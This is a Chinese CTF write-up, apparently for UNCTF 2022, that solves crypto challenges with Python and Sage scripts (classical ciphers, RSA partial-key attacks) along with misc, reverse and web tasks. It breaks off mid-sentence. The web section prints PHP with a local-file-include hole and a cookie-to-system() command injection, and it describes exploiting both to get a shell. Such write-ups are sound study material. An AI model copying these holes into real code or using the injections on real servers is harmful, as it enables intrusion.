class="token comment">#     if s =='G':</span><span class="token comment">#         print(i)</span>key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">]</span>x<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> c<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> ascii_uppercase<span class="token punctuation">:</span>        s <span class="token operator">=</span> table<span class="token punctuation">[</span>key<span class="token punctuation">[</span>x <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>base_table<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span>               <span class="token keyword">if</span> s <span class="token operator">==</span> j<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            x <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">UNCTF&#123;WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="single-table"><a href="#single-table" class="headerlink" title="single_table"></a>single_table</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span><span class="token number">1</span> B C D E F <span class="token number">2</span> G H I K M<span class="token number">3</span> N O  Q R S<span class="token number">4</span> T U V W X<span class="token number">5</span> Z P L A Y OT UB M<span class="token punctuation">&#123;</span>B CQ_SP H_W OQ A_U AY FM KL  WS<span class="token punctuation">&#125;</span><span class="token number">3</span> <span class="token number">2</span>  <span class="token number">4</span> <span class="token number">2</span>  U<span class="token number">4</span> <span class="token number">1</span>  <span class="token number">3</span> <span class="token number">1</span>  N<span class="token number">4</span> <span class="token number">2</span>    <span class="token number">1</span> <span class="token number">2</span> C<span class="token number">1</span> <span class="token number">1</span>   <span class="token number">4</span>  <span class="token number">1</span> T<span class="token number">2</span> <span class="token number">5</span> <span class="token number">1</span> <span class="token number">5</span>   F<span class="token punctuation">&#123;</span><span class="token number">1</span> <span class="token number">1</span>  <span class="token number">2</span> <span class="token number">1</span>  G<span class="token number">12</span> <span class="token number">32</span>   <span class="token number">0</span><span class="token number">33</span> <span class="token number">13</span>   D_<span class="token number">35</span> <span class="token number">55</span>   Y<span class="token number">52</span> <span class="token number">32</span>   <span class="token number">0</span><span class="token number">22</span> <span class="token number">42</span>    U_<span class="token number">44</span> <span class="token number">24</span>     K<span class="token number">32</span>  <span class="token number">32</span>   <span class="token number">0</span><span class="token number">33</span>  <span class="token number">33</span>  Q<span class="token number">54</span>   <span class="token number">44</span>  W_<span class="token number">42</span>  <span class="token number">52</span>   P<span class="token number">54</span>  <span class="token number">54</span>   A<span class="token number">55</span>  <span class="token number">55</span>   Y<span class="token number">15</span>  <span class="token number">25</span>  M<span class="token number">25</span>  <span class="token number">15</span>  F<span class="token number">24</span>  <span class="token number">54</span>  A<span class="token number">53</span>  <span class="token number">23</span>   I<span class="token number">44</span>  <span class="token number">34</span>  R<span class="token number">35</span>  <span class="token number">45</span>   X<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到UNCTF{GOD_YOU_KOQW_PAYMFAIRX}</p><p>然后因为这是playfair可以根据意思改一下flag</p><p>UNCTF{GOD_YOU_KNOW_PLAYFAIR}</p><h2 id="caesar"><a href="#caesar" class="headerlink" title="caesar"></a>caesar</h2><p>根据提示他把ASCII码表换成了base64对照表  然后找出每个字母对应的表数  经过尝试 凯撒的偏移量是19  但是有的加上19之后超过了64  所以减上64</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># c = 'B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY&#125;'</span>c <span class="token operator">=</span> <span class="token string">'B6vAydhdAOiZKiMyLYLUaJlL/HY'</span>   <span class="token comment">#去掉大括号和_</span>base_table<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'G'</span><span class="token punctuation">,</span><span class="token string">'H'</span><span class="token punctuation">,</span><span class="token string">'I'</span><span class="token punctuation">,</span><span class="token string">'J'</span><span class="token punctuation">,</span><span class="token string">'K'</span><span class="token punctuation">,</span><span class="token string">'L'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token punctuation">,</span><span class="token string">'O'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'Q'</span><span class="token punctuation">,</span><span class="token string">'R'</span><span class="token punctuation">,</span><span class="token string">'S'</span><span class="token punctuation">,</span><span class="token string">'T'</span><span class="token punctuation">,</span><span class="token string">'U'</span><span class="token punctuation">,</span><span class="token string">'V'</span><span class="token punctuation">,</span><span class="token string">'W'</span><span class="token punctuation">,</span><span class="token string">'X'</span><span class="token punctuation">,</span><span class="token string">'Y'</span><span class="token punctuation">,</span><span class="token string">'Z'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'j'</span><span class="token punctuation">,</span><span class="token string">'k'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'m'</span><span class="token punctuation">,</span><span class="token string">'n'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'p'</span><span class="token punctuation">,</span><span class="token string">'q'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">,</span><span class="token string">'v'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token string">'y'</span><span class="token punctuation">,</span><span class="token string">'z'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">,</span><span class="token string">'`+'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">]</span><span class="token builtin">list</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span>    <span class="token builtin">list</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>base_table<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">63</span><span class="token punctuation">:</span>        flag<span class="token operator">+=</span> base_table<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">19</span><span class="token operator">-</span><span class="token number">64</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flag<span class="token operator">+=</span>base_table<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">UNCTF&#123;w0w_Th1s_d1fFerent_c4eSar&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ddddd"><a href="#ddddd" class="headerlink" title="ddddd"></a>ddddd</h2><pre class="line-numbers language-none"><code class="language-none">根据题目可得这应该是摩丝密码  替换得..- -. -.-. - ..-. ----.-- -.-- ....- ... ..--.- - .... .---- ... ..--.- .--- ..- ... - ..--.- -- ----- .-. ... . -----.-UNCTF&#123;Y4S_TH1S_JUST_M0RSE&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ez-RSA"><a href="#ez-RSA" class="headerlink" title="ez-RSA"></a>ez-RSA</h2><p>该题位p的高位攻击  先还原出原来的p</p><p>先用sage求出p</p><p>然后利用脚本求出flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sage</span><span class="token comment"># n = 102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span><span class="token comment"># p= (8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857) &lt;&lt; 200</span><span class="token comment"># e = 0x10001</span><span class="token comment">#</span><span class="token comment"># pbits = p.nbits()</span><span class="token comment"># kbits = 200</span><span class="token comment"># ph = p &amp; (2 ^ pbits - 2 ^ kbits)</span><span class="token comment"># PR.&lt; x > = PolynomialRing(Zmod(n))</span><span class="token comment"># f = x + ph</span><span class="token comment"># xx = f.small_roots(X=2 ^ kbits, beta=0.4)[0]</span><span class="token comment"># print(xx + ph)</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume<span class="token operator">=</span><span class="token number">0x10001</span>c<span class="token operator">=</span><span class="token number">6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140</span>n<span class="token operator">=</span><span class="token number">102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span>p<span class="token operator">=</span> <span class="token number">13150231070519276795503757637337326535824298772055543325920447062237907554543786311611680606624189166397403108357856813812282725390555389844248256805325917</span>q <span class="token operator">=</span> n <span class="token operator">//</span> pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>UNCTF{It is a very_intersting_test!!!}</p><h2 id="BABYRSA"><a href="#BABYRSA" class="headerlink" title="BABYRSA"></a>BABYRSA</h2><p>该题是m高位攻击</p><p>先用sage脚本求出m然后直接转为flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">phase2</span><span class="token punctuation">(</span>high_m<span class="token punctuation">,</span> n<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    R<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">,</span> implementation<span class="token operator">=</span><span class="token string">'NTL'</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> high_m <span class="token operator">+</span> x    M <span class="token operator">=</span> m<span class="token punctuation">(</span><span class="token punctuation">(</span>m<span class="token operator">^</span><span class="token number">6</span> <span class="token operator">-</span> c<span class="token punctuation">)</span><span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n <span class="token operator">=</span> <span class="token number">25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431</span>c <span class="token operator">=</span> <span class="token number">15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107</span>high_m <span class="token operator">=</span> <span class="token number">11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240</span>phase2<span class="token punctuation">(</span>high_m<span class="token punctuation">,</span> n<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">11941439146252171444944646015445273361862078914338385912062672317789429687879409370002429378909002883709</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#UNCTF&#123;27a0aac7-76cb-427d-9129-1476360d5d1b&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="超级加倍"><a href="#超级加倍" class="headerlink" title="超级加倍"></a>超级加倍</h2><p>拿到一段数字刚开始没什么思路 然后就试了一下扔进分解网站上分解  得到一个数得四次方</p><p><img src="/2023/02/01/UNCTF/MyBlog\source_posts\UNCTF.assets\1668735177334.png" alt="1668735177334"></p><p>然后尝试了直接利用在线网站转为文本但是出不来   就试着转为字节流试了一下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">777244835068351678348953354168377613564714552731792102125659619461244461053654492541</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>UNCTF{it_is_much_bigger_than_before}</p><h2 id="今晚吃什么"><a href="#今晚吃什么" class="headerlink" title="今晚吃什么"></a>今晚吃什么</h2><p>刚开始以为是摩丝  但是每个之间都有空格  然后又试了一下  二进制都不对</p><p>然后又看了下题目  今晚吃什么  可以想到培根密码</p><p>然后把1000换成A 00000换成B然后在在线网站解密</p><p><img src="/2023/02/01/UNCTF/MyBlog\source_posts\UNCTF.assets\1668740686177.png" alt="1668740686177"></p><p>得到UNCTF{CRYPROISFUN}</p><h2 id="Fermat"><a href="#Fermat" class="headerlink" title="Fermat"></a>Fermat</h2><p>费马小定理</p><p>如果a,p两个数互为质数则    a**(p-1)  &#x3D;  1  mod p</p><p>g &#x3D; x(p-1)</p><p>这里令a&#x3D;2**x   p&#x3D;p</p><p>根据费马小定理得</p><p>2**x(p-1)   mod  p  &#x3D;  1</p><p>即为2**g  mod  p &#x3D; 1</p><p>(2**g  mod  n)  mod p &#x3D; 1</p><p>所以 pow(2,g,n) - 1 &#x3D;k*p</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">0x10001</span>n <span class="token operator">=</span> <span class="token number">19793392713544070457027688479915778034777978273001720422783377164900114996244094242708846944654400975309197274029725271852278868848866055341793968628630614866044892220651519906766987523723167772766264471738575578352385622923984300236873960423976260016266837752686791744352546924090533029391012155478169775768669029210298020072732213084681874537570149819864200486326715202569620771301183541168920293383480995205295027880564610382830236168192045808503329671954996275913950214212865497595508488636836591923116671959919150665452149128370999053882832187730559499602328396445739728918488554797208524455601679374538090229259</span>c <span class="token operator">=</span> <span class="token number">388040015421654529602726530745444492795380886347450760542380535829893454552342509717706633524047462519852647123869277281803838546899812555054346458364202308821287717358321436303133564356740604738982100359999571338136343563820284214462840345638397346674622692956703291932399421179143390021606803873010804742453728454041597734468711112843307879361621434484986414368504648335684946420377995426633388307499467425060702337163601268480035415645840678848175121483351171989659915143104037610965403453400778398233728478485618134227607237718738847749796204570919757202087150892548180370435537346442018275672130416574430694059</span>g <span class="token operator">=</span> <span class="token number">28493930909416220193248976348190268445371212704486248387964331415565449421099615661533797087163499951763570988748101165456730856835623237735728305577465527656655424601018192421625513978923509191087994899267887557104946667250073139087563975700714392158474439232535598303396614625803120915200062198119177012906806978497977522010955029535460948754300579519507100555238234886672451138350711195210839503633694262246536916073018376588368865238702811391960064511721322374269804663854748971378143510485102611920761475212154163275729116496865922237474172415758170527875090555223562882324599031402831107977696519982548567367160</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>g<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span>q <span class="token operator">=</span> n <span class="token operator">//</span> pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>UNCTF{DO_y0u_Fermat_1ittle_theOrem}</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="magic-word"><a href="#magic-word" class="headerlink" title="magic_word"></a>magic_word</h2><p>直接在网站上解码</p><p><img src="/2023/02/01/UNCTF/1668692896809.png" alt="1668692896809"></p><p>unctf{We1come_new_ctfer}</p><h2 id="找得到我吗"><a href="#找得到我吗" class="headerlink" title="找得到我吗"></a>找得到我吗</h2><p>把docx文件改为zip文件  然后解压得</p><p>然后以记事本打开</p><p><img src="/2023/02/01/UNCTF/1668693152120.png" alt="1668693152120">  </p><p>直接搜索flag得</p><p><img src="/2023/02/01/UNCTF/1668693203672.png" alt="1668693203672">UNCTF{You_find_me!}</p><h2 id="syslog"><a href="#syslog" class="headerlink" title="syslog"></a>syslog</h2><p>在syslog里面找到password    cGFzc3dvcmQgaXMgVTZudTJfaTNfYjNTdA&#x3D;&#x3D;  解码得   U6nu2_i3_b3St</p><p>然后输入压缩包密码  在flag.txt里面  找到flag</p><p><img src="/2023/02/01/UNCTF/1668693426170.png" alt="1668693426170"></p><p>unctf{N1_sH3_D0n9_L0g_dE!}</p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="welcomeUNCTF2022"><a href="#welcomeUNCTF2022" class="headerlink" title="welcomeUNCTF2022"></a>welcomeUNCTF2022</h2><p>经过分析得输入  UNCTF&amp;2022</p><p><img src="/2023/02/01/UNCTF/1668698214475.png" alt="1668698214475"></p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="whereisyourkey"><a href="#whereisyourkey" class="headerlink" title="whereisyourkey"></a>whereisyourkey</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token string">'vgpkcmhnci'</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#print(a[i])</span>    <span class="token keyword">if</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token string">'o'</span> <span class="token keyword">and</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;=</span><span class="token string">'n'</span><span class="token punctuation">:</span>        flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">UNCTF&#123;yesiamflag&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p>通过上传文件可以得出只有png文件可以上传成功</p><p>然后通过扫描网站目录得到一个<a href="http://www.rar压缩包下载得到index.php/">www.rar压缩包下载得到index.php</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|\.\.|\/\//i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"no hack"</span><span class="token punctuation">;</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现如果通过GET方式传入一个文件 如果不出现被过滤得词就会include包含</p><p>然后就上传一个png文件 发现POST好像被过滤  那我们就用GET构造shell</p><p><img src="/2023/02/01/UNCTF/1668607591804.png" alt="1668607591804"></p><p><img src="/2023/02/01/UNCTF/1668607675461.png" alt="1668607675461"></p><p>然后在tmp下找到了flag.sh</p><p>然后cat查看内容</p><p><img src="/2023/02/01/UNCTF/1668607760805.png" alt="1668607760805"></p><p>flag目录应该在&#x2F;home&#x2F;ctf&#x2F;flag目录下</p><p>然后cat得到   UNCTF{165e39e0-cae3-4935-80cd-e7ef9242edee}</p><h2 id="我太喜欢bilibili大学啦修复版"><a href="#我太喜欢bilibili大学啦修复版" class="headerlink" title="我太喜欢bilibili大学啦修复版"></a>我太喜欢bilibili大学啦修复版</h2><p>先是找到了hint_1    YWRtaW5fdW5jdGYucGhw</p><p>base64解码得          admin_unctf.php</p><p>然后得到一个登录页面查看源代码提醒我们抓包   在响应头里找到</p><p>dW5jdGYyMDIyL3VuY3RmMjAyMg&#x3D;&#x3D;</p><p>解码得unctf2022&#x2F;unctf2022</p><p>登陆得</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpputenv(&quot;FLAG&#x3D;nonono&quot;);if(!isset($_POST[&#39;username&#39;]) &amp;&amp; !isset($_POST[&#39;password&#39;]))&#123;    exit(&quot;username or password is empty&quot;);&#125;else&#123;    if($_POST[&#39;username&#39;] &#x3D;&#x3D;&#x3D; &quot;unctf2022&quot; &amp;&amp; $_POST[&#39;password&#39;] &#x3D;&#x3D;&#x3D; &quot;unctf2022&quot;)&#123;        show_source(__FILE__);        @system(&quot;ping &quot;.$_COOKIE[&#39;cmd&#39;]);    &#125;else&#123;        exit(&quot;username or password error&quot;);    &#125;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在cookie里加入cmd命令</p><p><img src="/2023/02/01/UNCTF/1668609960920.png" alt="1668609960920"></p><p>base64解密到</p><p><a href="https://space.bilibili.com/673907356">https://space.bilibili.com/673907356</a></p><p>访问得到flag</p><p>UNCTF{this_is_so_easy}</p><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p><img src="/2023/02/01/UNCTF/1668610926120.png" alt="1668610926120"></p><p>在源码里找到  20200101  20200101</p><p>然后后面是   20200102   20200102</p><p>一直到          20200131  20200131  </p><p>得到flag    flag{bfff6d206cbcd6ac0870a4f48</p><p>但是再往下flag就断了</p><p>最后发现2020132  